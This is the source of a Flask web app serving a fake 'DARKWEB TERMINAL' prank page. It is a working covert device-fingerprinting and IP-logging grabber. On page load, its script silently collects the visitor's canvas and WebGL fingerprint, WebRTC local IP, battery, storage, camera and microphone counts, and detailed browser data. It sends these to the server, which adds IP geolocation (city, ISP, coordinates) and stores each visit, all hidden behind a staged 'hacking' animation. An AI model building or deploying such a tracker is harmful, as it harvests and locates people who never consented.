from flask import Flask, request
from datetime import datetime
import requests
import json

app = Flask(__name__)

LOG_FILE = "visits.jsonl"

def geo_lookup(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        return r.json()
    except:
        return {}

def save_visit(data, ip, geo, time):
    try:
        record = {"time": time, "ip": ip, "geo": geo, "data": data}
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(record) + "\n")
    except Exception as e:
        print(f"[logfile error] {e}")

@app.route("/")
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Turtle</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                overflow: hidden;
                font-family: "Courier New", monospace;
                background: #000;
                color: #0f0;
            }

            canvas {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
            }

            .screen {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 90%;
                max-width: 900px;
                height: 80%;
                border: 2px solid #0f0;
                padding: 20px;
                border-radius: 10px;
                background: rgba(0,0,0,0.7);
                box-shadow: 0 0 20px #0f0;
                color: #0f0;
            }

            .title {
                text-align: center;
                font-size: 28px;
                margin-bottom: 10px;
                animation: glow 1.5s infinite;
            }

            @keyframes glow {
                0% { text-shadow: 0 0 5px #0f0; }
                50% { text-shadow: 0 0 20px #0f0; }
                100% { text-shadow: 0 0 5px #0f0; }
            }

            .terminal {
                background: #000;
                border: 1px solid #0f0;
                height: 70%;
                overflow: auto;
                padding: 15px;
                border-radius: 5px;
            }

            .line {
                margin: 0;
                font-size: 14px;
                white-space: pre-wrap;
            }

            .progress {
                margin-top: 10px;
                width: 100%;
                background: #111;
                border: 2px solid #0f0;
                border-radius: 10px;
                overflow: hidden;
            }

            .bar {
                height: 18px;
                width: 0;
                background: linear-gradient(90deg, #0f0, #00ff99);
            }

            .bar.run {
                animation: loading 8s forwards;
            }

            @keyframes loading {
                0% { width: 0; }
                100% { width: 100%; }
            }

            .status {
                margin-top: 10px;
                font-size: 14px;
                text-align: center;
            }

            /* ================= INTRO OVERLAY ================= */
            #intro {
                position: fixed;
                inset: 0;
                background: #000;
                z-index: 100;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                overflow: hidden;
                transition: box-shadow 0.2s;
            }

            /* 3-second crash shake */
            #intro.shake {
                animation: crashShake 0.1s infinite;
                box-shadow: inset 0 0 140px rgba(255,0,0,0.5);
            }

            @keyframes crashShake {
                0%   { transform: translate(0, 0) rotate(0deg); }
                20%  { transform: translate(-14px, 9px) rotate(-1.2deg); }
                40%  { transform: translate(12px, -11px) rotate(1deg); }
                60%  { transform: translate(-10px, -7px) rotate(-0.6deg); }
                80%  { transform: translate(13px, 9px) rotate(1.4deg); }
                100% { transform: translate(-11px, 8px) rotate(-0.8deg); }
            }

            /* ---- SVG mask drawing ---- */
            #maskSvg {
                filter: drop-shadow(0 0 18px rgba(0,255,0,0.6));
                margin-bottom: 25px;
            }

            #maskSvg path {
                stroke: #0f0;
                stroke-width: 2.5;
                fill: transparent;
                stroke-dasharray: 1;
                stroke-dashoffset: 1;
                pathLength: 1;
                animation: drawStroke 0.9s ease forwards;
                transition: fill 0.6s ease, stroke 0.6s ease;
            }

            @keyframes drawStroke {
                to { stroke-dashoffset: 0; }
            }

            /* after drawing completes, colors settle */
            #maskSvg.filled .face { fill: #f2f2f2; }
            #maskSvg.filled .eye { fill: #000; stroke: #000; }
            #maskSvg.filled .nose { fill: #f2f2f2; }

            /* ---- Welcome text ---- */
            #welcome {
                opacity: 0;
                transform: scale(0.9);
                transition: opacity 0.8s ease, transform 0.8s ease;
                text-align: center;
            }

            #welcome.show {
                opacity: 1;
                transform: scale(1);
            }

            #welcome h1 {
                font-size: 44px;
                letter-spacing: 6px;
                margin: 0;
                animation: glow 1.2s infinite;
            }

            #welcome .sub {
                color: #0f0;
                font-size: 16px;
                letter-spacing: 8px;
                opacity: 0.7;
                margin-top: 8px;
                animation: blink 1s steps(2) infinite;
            }

            @keyframes blink {
                50% { opacity: 0.15; }
            }

            /* ---- Crash screen ---- */
            #crash {
                display: none;
                text-align: center;
                position: absolute;
                inset: 0;
                background: rgba(0,0,0,0.85);
                flex-direction: column;
                align-items: center;
                justify-content: center;
            }

            #crash.show {
                display: flex;
            }

            #crash .big {
                font-size: 52px;
                font-weight: bold;
                color: #f00;
                text-shadow: 0 0 18px #f00, 0 0 60px #f00;
                margin: 0;
                animation: glitchFlicker 0.12s steps(2) infinite;
            }

            #crash .err {
                color: #ff5555;
                font-size: 15px;
                margin-top: 14px;
                letter-spacing: 2px;
                white-space: pre-line;
                animation: glitchFlicker 0.2s steps(2) infinite;
            }

            @keyframes glitchFlicker {
                0%   { opacity: 1; transform: translateX(0); }
                25%  { opacity: 0.75; transform: translateX(-3px); }
                50%  { opacity: 1; transform: translateX(3px); }
                75%  { opacity: 0.8; transform: translateX(-2px); }
                100% { opacity: 1; transform: translateX(2px); }
            }

            /* ---- Blackout ---- */
            #blackout {
                position: fixed;
                inset: 0;
                background: #000;
                z-index: 200;
                opacity: 0;
                pointer-events: none;
                transition: opacity 0.5s ease;
            }

            #blackout.on {
                opacity: 1;
                pointer-events: all;
            }
        </style>
    </head>
    <body>
        <canvas id="matrix"></canvas>
        <canvas id="orbit"></canvas>

        <div class="screen">
            <div class="title">DARKWEB TERMINAL</div>
            <div class="terminal" id="terminal"></div>

            <div class="progress">
                <div class="bar" id="bar"></div>
            </div>

            <div class="status" id="status">Initializing...</div>
        </div>

        <!-- ================= INTRO ================= -->
        <div id="intro">
            <!-- SVG HACKER MASK (beard removed) -->
            <svg id="maskSvg" viewBox="0 0 220 240" width="260" height="280">
                <path class="face"      d="M110 28 C 66 28, 30 68, 30 116 C 30 142, 44 162, 58 172 C 72 182, 88 200, 110 200 C 132 200, 148 182, 162 172 C 176 162, 190 142, 190 116 C 190 68, 154 28, 110 28 Z"/>
                <path class="cheek"     d="M34 120 C 44 150, 60 168, 74 176"/>
                <path class="cheek"     d="M186 120 C 176 150, 160 168, 146 176"/>
                <path class="brow"      d="M58 92 Q 82 70, 106 92"/>
                <path class="brow"      d="M114 92 Q 138 70, 162 92"/>
                <path class="eye"       d="M60 102 Q 80 88, 102 102 Q 80 116, 60 102 Z"/>
                <path class="eye"       d="M118 102 Q 140 88, 160 102 Q 140 116, 118 102 Z"/>
                <path class="nose"      d="M110 102 L 102 130 Q 110 136, 118 130 Z"/>
            </svg>

            <div id="welcome">
                <h1>WELCOME TO DARK CAVE</h1>
                <div class="sub">ACCESS GRANTED</div>
            </div>

            <!-- Crash screen -->
            <div id="crash">
                <p class="big">SYSTEM CRASH</p>
                <p class="err">> CRITICAL ERROR: memory access violation
> Dumping core...
> Attempting reboot...</p>
            </div>
        </div>

        <div id="blackout"></div>

        <script>
            // MATRIX BACKGROUND
            const canvas = document.getElementById("matrix");
            const ctx = canvas.getContext("2d");
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
            const fontSize = 16;
            const columns = canvas.width / fontSize;
            const drops = Array(Math.floor(columns)).fill(1);

            function drawMatrix() {
                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = "#0f0";
                ctx.font = fontSize + "px monospace";

                for (let i = 0; i < drops.length; i++) {
                    const text = letters[Math.floor(Math.random() * letters.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            setInterval(drawMatrix, 50);

            // SATELLITE ORBIT
            const orbitCanvas = document.getElementById("orbit");
            const octx = orbitCanvas.getContext("2d");
            orbitCanvas.width = window.innerWidth;
            orbitCanvas.height = window.innerHeight;

            let angle = 0;

            function drawOrbit() {
                octx.clearRect(0, 0, orbitCanvas.width, orbitCanvas.height);

                const cx = orbitCanvas.width / 2;
                const cy = orbitCanvas.height / 2;
                const r = 260;

                // WORLD NODES
                const nodes = [
                    {x: cx - 300, y: cy - 150},
                    {x: cx + 250, y: cy - 200},
                    {x: cx + 320, y: cy + 120},
                    {x: cx - 260, y: cy + 220},
                    {x: cx, y: cy - 250},
                    {x: cx - 100, y: cy + 240}
                ];

                nodes.forEach(n => {
                    octx.fillStyle = "rgba(0,255,0,0.8)";
                    octx.beginPath();
                    octx.arc(n.x, n.y, 3, 0, Math.PI*2);
                    octx.fill();
                });

                // ORBIT RING
                octx.strokeStyle = "rgba(0,255,0,0.5)";
                octx.beginPath();
                octx.arc(cx, cy, r, 0, Math.PI*2);
                octx.stroke();

                // SATELLITE
                const satX = cx + Math.cos(angle) * r;
                const satY = cy + Math.sin(angle) * r;

                octx.fillStyle = "#0f0";
                octx.beginPath();
                octx.arc(satX, satY, 6, 0, Math.PI*2);
                octx.fill();

                // PACKET TRAILS
                for (let i = 0; i < 6; i++) {
                    const t = Math.random();
                    const px = cx + Math.cos(angle + t) * (r * (0.5 + t));
                    const py = cy + Math.sin(angle + t) * (r * (0.5 + t));
                    octx.fillStyle = "rgba(0,255,0,0.3)";
                    octx.fillRect(px, py, 2, 2);
                }

                angle += 0.01;
            }
            setInterval(drawOrbit, 30);

            // TERMINAL
            const terminal = document.getElementById("terminal");
            const status = document.getElementById("status");
            const bar = document.getElementById("bar");

            function typeLine(text, delay = 18) {
                return new Promise(resolve => {
                    let i = 0;
                    const line = document.createElement("p");
                    line.className = "line";
                    terminal.appendChild(line);

                    // FIX: handle empty line
                    if (!text) {
                        line.textContent = "";
                        resolve();
                        return;
                    }

                    const timer = setInterval(() => {
                        line.textContent += text[i];
                        i++;
                        terminal.scrollTop = terminal.scrollHeight;
                        if (i >= text.length) {
                            clearInterval(timer);
                            resolve();
                        }
                    }, delay);
                });
            }

            async function runTerminal(info) {
                status.innerText = "Hacking in progress...";
                bar.classList.add("run");   // start progress bar only now

                await typeLine("[SYSTEM] Initializing secure tunnel...");
                await typeLine("[SYSTEM] Connecting to darknet node...");
                await typeLine("[SYSTEM] Injecting payload...");
                await typeLine("[SYSTEM] Bypassing firewall...");
                await typeLine("[SYSTEM] Extracting session tokens...");
                await typeLine("[SYSTEM] Dumping data...");
                await typeLine(" ");  // SAFE empty line

                await typeLine("===== TARGET SYSTEM =====");
                await typeLine(`Browser: ${info.browser.name} ${info.browser.version}`);
                await typeLine(`Platform: ${info.platform}`);
                await typeLine(`OS: ${info.os.name} ${info.os.version}`);
                await typeLine(`Language: ${info.language}`);
                await typeLine(`Timezone: ${info.timezone} (UTC${info.timezoneOffset})`);
                await typeLine(" ");  // SAFE empty line

                await typeLine("===== DEVICE INFO =====");
                await typeLine(`Device: ${info.deviceModel}`);
                await typeLine(`GPU: ${(info.gpu && info.gpu.renderer) || "Unknown"}`);
                await typeLine(`Arch: ${(info.uaData && info.uaData.architecture) || "Unknown"} ${(info.uaData && info.uaData.bitness) || "?"}bit`);
                await typeLine(`Screen: ${info.screen.width}x${info.screen.height} @${info.pixelRatio}x, ${info.colorDepth}bit`);
                await typeLine(`Orientation: ${info.orientation}`);
                await typeLine(`Touch: ${info.touch.supported ? "Yes" : "No"} (${info.touch.maxPoints} pts)`);
                await typeLine(`Storage: ${info.storageEstimate}`);
                await typeLine(`Local IP: ${info.localIP || "Unknown"}`);
                await typeLine(`Battery: ${info.battery || "Unknown"}`);
                const mediaDev = info.mediaDevices || {};
                await typeLine(`Media: ${mediaDev.videoinput ?? "?"} cam / ${mediaDev.audioinput ?? "?"} mic`);
                await typeLine(" ");  // SAFE empty line

                await typeLine("===== DATA DECODING =====");
                await typeLine("[!] ENCRYPTED BLOCK // UNDECODED");
                await typeLine("0x00: 7F 3A 91 C4 5E 22 B8 0D 4F 1A 88 63 E2 77 09 A5");
                await typeLine("0x10: D3 6B 41 F0 9C 2E 55 87 1B 64 A9 30 CE 5F 72 0E");
                await typeLine("0x20: 9B 47 1C F6 82 3D 0B 55 E8 14 6A 90 3F 7C C1 2D");
                await typeLine("0x30: 58 9E 21 4D B7 66 A3 08 F9 1E 84 37 C5 6A 0D 92");
                await typeLine("0x40: C4 5F A1 7E 92 0D B3 6F 21 8C 5A D7 40 9E 63 15");
                await typeLine(" ");
                await typeLine("[!] UNKNOWN FORMAT - CANNOT DECODE");
                await typeLine("ZGh2OThhZTEzY2I0... (base64? undecoded)");
                await typeLine("2F 53 E1 9C 77 0B 4A 8D ... (raw bytes)");
                await typeLine("µ § ± Æ × ß ð ø ¶ Œ æ ç ñ ~ (binary garbage)");
                await typeLine(" ");
                await typeLine("[!] DECRYPTION FAILED - KEY NOT FOUND");
                await typeLine("> 0 valid credentials recovered");
                await typeLine("> payload remains unknown / undecoded");
                await typeLine("> session terminated");

                status.innerText = "Hacked";
            }

            async function sendDetails(data) {
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            }

            // ================= DEVICE FINGERPRINTING =================

            // ---- OS + version from User-Agent ----
            function parseOS(ua) {
                const os = { name: "Unknown", version: "Unknown" };
                try {
                    if (/android/i.test(ua)) {
                        const m = ua.match(/Android\\s+([\\d.]+)/i);
                        os.name = "Android";
                        os.version = m ? m[1] : "?";
                    } else if (/iPhone|iPad|iPod/i.test(ua)) {
                        const m = ua.match(/OS\\s+(\\d+)[_.](\\d+)(?:[_.](\\d+))?/i);
                        os.name = /iPad/i.test(ua) ? "iPadOS" : "iOS";
                        os.version = m ? `${m[1]}.${m[2]}${m[3] ? "." + m[3] : ""}` : "?";
                    } else if (/Windows/i.test(ua)) {
                        os.name = "Windows";
                        const m = ua.match(/Windows NT ([\\d.]+)/);
                        os.version = m ? m[1] : "?";
                    } else if (/Mac OS X/i.test(ua)) {
                        const m = ua.match(/Mac OS X ([\\d_]+)/);
                        os.name = "macOS";
                        os.version = m ? m[1].replace(/_/g, ".") : "?";
                    } else if (/CrOS/i.test(ua)) {
                        os.name = "ChromeOS";
                        os.version = "?";
                    } else if (/Linux/i.test(ua)) {
                        os.name = "Linux";
                        os.version = "?";
                    } else if (/X11/i.test(ua)) {
                        os.name = "Unix";
                        os.version = "?";
                    }
                } catch (e) {}
                return os;
            }

            // ---- Device model (Samsung SM-*, Pixel, iPhone identifiers) ----
            function parseDeviceModel(ua) {
                try {
                    let m = ua.match(/\\(([^;()]+); Android [\\d.]+; ([^;()]+)[;) ]/);
                    if (m) return m[2].trim().split(" Build")[0];
                    m = ua.match(/iPhone(\\d+,\\d+)/);
                    if (m) return "iPhone " + m[1];
                    m = ua.match(/iPad(\\d+,\\d+)/);
                    if (m) return "iPad " + m[1];
                    if (/Mac OS X/.test(ua)) return "Mac";
                    m = ua.match(/Windows NT [\\d.]+; ([^;)]+)/);
                    if (m) return m[1].trim();
                } catch (e) {}
                return "Unknown";
            }

            // ---- Browser name + version ----
            function parseBrowser(ua) {
                try {
                    if (/Edg\\//.test(ua)) return { name: "Edge", version: ua.match(/Edg\\/([\\d.]+)/)[1] };
                    if (/OPR\\//.test(ua)) return { name: "Opera", version: ua.match(/OPR\\/([\\d.]+)/)[1] };
                    if (/Chrome\\//.test(ua)) return { name: "Chrome", version: ua.match(/Chrome\\/([\\d.]+)/)[1] };
                    if (/Firefox\\//.test(ua)) return { name: "Firefox", version: ua.match(/Firefox\\/([\\d.]+)/)[1] };
                    if (/Safari\\//.test(ua)) {
                        const v = ua.match(/Version\\/([\\d.]+)/);
                        return { name: "Safari", version: v ? v[1] : "?" };
                    }
                } catch (e) {}
                return { name: "Unknown", version: "?" };
            }

            // ---- GPU via WebGL ----
            function getGPU() {
                try {
                    const gl = document.createElement("canvas").getContext("webgl") || document.createElement("canvas").getContext("experimental-webgl");
                    if (gl) {
                        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
                        if (dbg) {
                            return {
                                renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL),
                                vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)
                            };
                        }
                    }
                } catch (e) {}
                return null;
            }

            // ---- Small fingerprint hash (djb2) ----
            function hashString(s) {
                let h = 5381;
                for (let i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) >>> 0;
                return h.toString(16);
            }

            function canvasFingerprint() {
                try {
                    const c = document.createElement("canvas");
                    c.width = 250; c.height = 60;
                    const cx = c.getContext("2d");
                    cx.textBaseline = "top";
                    cx.font = "14px Arial";
                    cx.fillStyle = "#f60";
                    cx.fillRect(0, 0, 250, 60);
                    cx.fillStyle = "#069";
                    cx.fillText("darkcave-fp-7f3a", 10, 20);
                    cx.fillStyle = "rgba(102, 204, 0, 0.7)";
                    cx.fillText("turtle-terminal", 40, 40);
                    return hashString(c.toDataURL());
                } catch (e) {}
                return null;
            }

            // ---- High-entropy UA data (Chrome/Edge only) ----
            async function getHighEntropy() {
                try {
                    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                        return await navigator.userAgentData.getHighEntropyValues([
                            "architecture", "bitness", "model",
                            "platformVersion", "uaFullVersion", "fullVersionList"
                        ]);
                    }
                } catch (e) {}
                return null;
            }

            // ---- Local IP via WebRTC STUN ----
            function getLocalIP() {
                return new Promise(resolve => {
                    try {
                        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                        pc.createDataChannel("");
                        let done = false;
                        const finish = ip => {
                            if (!done) { done = true; try { pc.close(); } catch (e) {} resolve(ip); }
                        };
                        pc.onicecandidate = e => {
                            if (!e.candidate) { finish(null); return; }
                            const m = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                            if (m) finish(m[1]);
                        };
                        setTimeout(() => finish(null), 2000);
                        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => finish(null));
                    } catch (e) { resolve(null); }
                });
            }

            // ---- Media devices (camera/mic counts, no permission prompts) ----
            async function getMediaDevices() {
                try {
                    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        const counts = { audioinput: 0, videoinput: 0, audiooutput: 0 };
                        devices.forEach(d => { if (counts[d.kind] !== undefined) counts[d.kind]++; });
                        return counts;
                    }
                } catch (e) {}
                return null;
            }

            // ---- Fast fields ----
            function collectFast() {
                const ua = navigator.userAgent;
                const os = parseOS(ua);
                const browser = parseBrowser(ua);
                const gpu = getGPU();
                const plugins = [];
                try { for (const p of navigator.plugins || []) plugins.push(p.name); } catch (e) {}

                return {
                    userAgent: ua,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages || [],
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: -new Date().getTimezoneOffset() / 60,
                    localTime: new Date().toString(),
                    screen: { width: screen.width, height: screen.height },
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1,
                    orientation: (screen.orientation && screen.orientation.type) || "Unknown",
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory || "Unknown",
                    connection: navigator.connection ? `${navigator.connection.effectiveType} ${navigator.connection.downlink}Mbps` : "Unknown",
                    os: os,
                    deviceModel: parseDeviceModel(ua),
                    browser: browser,
                    gpu: gpu,
                    touch: {
                        supported: "ontouchstart" in window || navigator.maxTouchPoints > 0,
                        maxPoints: navigator.maxTouchPoints || 0
                    },
                    cookiesEnabled: navigator.cookieEnabled,
                    online: navigator.onLine,
                    doNotTrack: navigator.doNotTrack || "unspecified",
                    plugins: plugins,
                    referrer: document.referrer || "",
                    canvasFp: canvasFingerprint()
                };
            }

            // ---- Slow fields (battery, storage, local IP, hi-entropy, media) ----
            async function collectExtended() {
                const battery = await navigator.getBattery()
                    .then(b => `${Math.round(b.level * 100)}% ${b.charging ? "(Charging)" : "(Not charging)"}`)
                    .catch(() => "Unknown");

                let storageEstimate = "Unknown";
                try {
                    if (navigator.storage && navigator.storage.estimate) {
                        const est = await navigator.storage.estimate();
                        if (est.quota) {
                            storageEstimate = `${Math.round(est.usage / 1024 / 1024)}MB used / ${(est.quota / 1024 / 1024 / 1024).toFixed(1)}GB`;
                        }
                    }
                } catch (e) {}

                const [uaData, localIP, mediaDevices] = await Promise.all([
                    getHighEntropy().catch(() => null),
                    getLocalIP().catch(() => null),
                    getMediaDevices().catch(() => null)
                ]);

                return {
                    battery: battery,
                    storageEstimate: storageEstimate,
                    uaData: uaData,
                    localIP: localIP,
                    mediaDevices: mediaDevices
                };
            }

            // ================= MAIN FLOW: ALL DATA IN ONE STEP =================
            async function collectInfo() {
                const info = collectFast();          // instant fields

                // start the intro immediately (visitor sees no delay)
                playIntro().then(() => runTerminal(info));

                // gather slow fields in the background, merge them,
                // then send ONE single POST containing EVERYTHING
                const extended = await collectExtended();
                Object.assign(info, extended);
                sendDetails(info);
            }

            // ================= INTRO MUSIC (Web Audio, auto-play, no button) =================
            let audioCtx = null;
            let musicMaster = null;
            let musicTimers = [];
            let musicOn = false;

            function initMusic() {
                try {
                    const AC = window.AudioContext || window.webkitAudioContext;
                    if (!AC) return;
                    audioCtx = new AC();

                    musicMaster = audioCtx.createGain();
                    musicMaster.gain.value = 0.0001;
                    musicMaster.connect(audioCtx.destination);

                    // --- dark bass drone (55Hz + 110Hz) ---
                    const drone = audioCtx.createOscillator();
                    drone.type = "sawtooth";
                    drone.frequency.value = 55;
                    const drone2 = audioCtx.createOscillator();
                    drone2.type = "sawtooth";
                    drone2.frequency.value = 110.5;

                    const droneFilter = audioCtx.createBiquadFilter();
                    droneFilter.type = "lowpass";
                    droneFilter.frequency.value = 240;
                    const droneGain = audioCtx.createGain();
                    droneGain.gain.value = 0.09;

                    // slow LFO wobbles the filter (menacing feel)
                    const lfo = audioCtx.createOscillator();
                    lfo.frequency.value = 0.12;
                    const lfoGain = audioCtx.createGain();
                    lfoGain.gain.value = 130;
                    lfo.connect(lfoGain).connect(droneFilter.frequency);

                    drone.connect(droneFilter);
                    drone2.connect(droneFilter);
                    droneFilter.connect(droneGain).connect(musicMaster);
                    drone.start();
                    drone2.start();
                    lfo.start();

                    // --- dark arpeggio sequencer (minor scale, random octaves) ---
                    const notes = [110, 130.81, 164.81, 196, 220, 261.63]; // A minor
                    let step = 0;
                    const arpTimer = setInterval(() => {
                        if (!musicOn || !audioCtx) return;
                        const osc = audioCtx.createOscillator();
                        const g = audioCtx.createGain();
                        osc.type = "triangle";
                        osc.frequency.value = notes[step % notes.length] * (Math.random() > 0.72 ? 2 : 1);
                        const now = audioCtx.currentTime;
                        g.gain.setValueAtTime(0.0001, now);
                        g.gain.exponentialRampToValueAtTime(0.055, now + 0.012);
                        g.gain.exponentialRampToValueAtTime(0.0001, now + 0.34);
                        osc.connect(g).connect(musicMaster);
                        osc.start(now);
                        osc.stop(now + 0.4);
                        step++;
                    }, 190);
                    musicTimers.push(arpTimer);

                    // --- random static/noise bursts (radio chatter vibe) ---
                    const noiseTimer = setInterval(() => {
                        if (!musicOn || !audioCtx) return;
                        if (Math.random() > 0.6) return;
                        const len = audioCtx.sampleRate * 0.25;
                        const buffer = audioCtx.createBuffer(1, len, audioCtx.sampleRate);
                        const data = buffer.getChannelData(0);
                        for (let i = 0; i < len; i++) data[i] = (Math.random() * 2 - 1) * (1 - i / len);
                        const src = audioCtx.createBufferSource();
                        src.buffer = buffer;
                        const bp = audioCtx.createBiquadFilter();
                        bp.type = "bandpass";
                        bp.frequency.value = 1000 + Math.random() * 2500;
                        const g = audioCtx.createGain();
                        g.gain.value = 0.045;
                        src.connect(bp).connect(g).connect(musicMaster);
                        src.start();
                    }, 2300);
                    musicTimers.push(noiseTimer);

                    musicOn = true;
                    musicMaster.gain.cancelScheduledValues(audioCtx.currentTime);
                    musicMaster.gain.setValueAtTime(0.0001, audioCtx.currentTime);
                    musicMaster.gain.exponentialRampToValueAtTime(0.8, audioCtx.currentTime + 1.2);

                    // --- autoplay policy workaround: no button, unlock on ANY first interaction ---
                    const unlock = () => {
                        if (audioCtx && audioCtx.state === "suspended") {
                            audioCtx.resume().catch(() => {});
                        }
                        window.removeEventListener("mousedown", unlock);
                        window.removeEventListener("touchstart", unlock);
                        window.removeEventListener("keydown", unlock);
                        window.removeEventListener("scroll", unlock);
                    };
                    if (audioCtx.state === "suspended") {
                        audioCtx.resume().catch(() => {});
                        window.addEventListener("mousedown", unlock);
                        window.addEventListener("touchstart", unlock);
                        window.addEventListener("keydown", unlock);
                        window.addEventListener("scroll", unlock);
                    }
                } catch (e) {
                    // audio unsupported — intro just runs silent
                }
            }

            function stopMusic() {
                musicOn = false;
                musicTimers.forEach(t => clearInterval(t));
                musicTimers = [];
                if (audioCtx && musicMaster) {
                    const now = audioCtx.currentTime;
                    musicMaster.gain.cancelScheduledValues(now);
                    musicMaster.gain.setValueAtTime(Math.max(musicMaster.gain.value, 0.0001), now);
                    musicMaster.gain.exponentialRampToValueAtTime(0.0001, now + 0.8);
                }
            }

            // ================= INTRO SEQUENCE =================
            const sleep = ms => new Promise(r => setTimeout(r, ms));
            const intro = document.getElementById("intro");
            const maskSvg = document.getElementById("maskSvg");
            const welcome = document.getElementById("welcome");
            const crash = document.getElementById("crash");
            const blackout = document.getElementById("blackout");

            async function playIntro() {
                initMusic();   // start music with the intro

                // 1. mask draws itself (paths draw one after another)
                const paths = maskSvg.querySelectorAll("path");
                paths.forEach((p, i) => {
                    p.style.animationDelay = (i * 0.22) + "s";
                });

                // 2. after drawing, color the mask + show welcome text
                await sleep(3000);
                maskSvg.classList.add("filled");
                welcome.classList.add("show");

                // 3. crash phase: shake the whole screen for 3 seconds
                await sleep(2500);
                welcome.classList.remove("show");
                crash.classList.add("show");
                intro.classList.add("shake");

                await sleep(3000);   // <-- 3s shaking

                // 4. blackout everything, then kill the music
                intro.classList.remove("shake");
                crash.classList.remove("show");
                blackout.classList.add("on");
                await sleep(600);

                intro.style.display = "none";
                blackout.classList.remove("on");
                await sleep(500);
                blackout.style.display = "none";
            }

            collectInfo();
        </script>
    </body>
    </html>
    """

@app.route("/log", methods=["POST"])
def log():
    data = request.get_json() or {}
    ip = request.headers.get("CF-Connecting-IP") or request.remote_addr
    geo = geo_lookup(ip)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    save_visit(data, ip, geo, time)

    os_info = data.get("os") or {}
    browser = data.get("browser") or {}
    gpu = data.get("gpu") or {}
    screen = data.get("screen") or {}
    touch = data.get("touch") or {}
    ua = data.get("uaData") or {}
    media = data.get("mediaDevices") or {}

    print("\n====== New Visit ======")
    print(f"Time          : {time}")
    print(f"IP Address    : {ip}")
    print(f"Country       : {geo.get('country')}")
    print(f"City          : {geo.get('city')}")
    print(f"ISP           : {geo.get('isp')}")
    print(f"Latitude      : {geo.get('lat')}")
    print(f"Longitude     : {geo.get('lon')}")
    print("--- OS / Device ---")
    print(f"OS (UA)       : {os_info.get('name')} {os_info.get('version')}")
    print(f"OS (Hi-Ent)   : {ua.get('platform')} {ua.get('platformVersion')}")
    print(f"Device Model  : {data.get('deviceModel')}")
    print(f"Hi-Ent Model  : {ua.get('model')}")
    print(f"Arch / Bits   : {ua.get('architecture')} / {ua.get('bitness')}")
    print(f"Browser       : {browser.get('name')} {browser.get('version')} (full: {ua.get('uaFullVersion')})")
    print(f"GPU           : {gpu.get('renderer')}")
    print("--- Display ---")
    print(f"Screen        : {screen.get('width')}x{screen.get('height')} @{data.get('pixelRatio')}x, {data.get('colorDepth')}bit")
    print(f"Orientation   : {data.get('orientation')}")
    print("--- System ---")
    print(f"CPU Cores     : {data.get('cores')}")
    print(f"Memory        : {data.get('memory')} GB")
    print(f"Connection    : {data.get('connection')}")
    print(f"Battery       : {data.get('battery')}")
    print(f"Storage       : {data.get('storageEstimate')}")
    print(f"Local IP      : {data.get('localIP')}")
    print(f"Media Devices : {media.get('videoinput')} cam / {media.get('audioinput')} mic / {media.get('audiooutput')} speaker")
    print("--- Browser ---")
    print(f"User-Agent    : {data.get('userAgent')}")
    print(f"Languages     : {data.get('languages')}")
    print(f"Timezone      : {data.get('timezone')} (UTC{data.get('timezoneOffset')})")
    print(f"Local Time    : {data.get('localTime')}")
    print(f"Touch         : {touch.get('supported')} ({touch.get('maxPoints')} pts)")
    print(f"Cookies       : {data.get('cookiesEnabled')}")
    print(f"Online        : {data.get('online')}")
    print(f"DoNotTrack    : {data.get('doNotTrack')}")
    print(f"Plugins       : {data.get('plugins')}")
    print(f"Referrer      : {data.get('referrer')}")
    print(f"Canvas FP     : {data.get('canvasFp')}")
    print("=========================\n")

    return "Logged", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
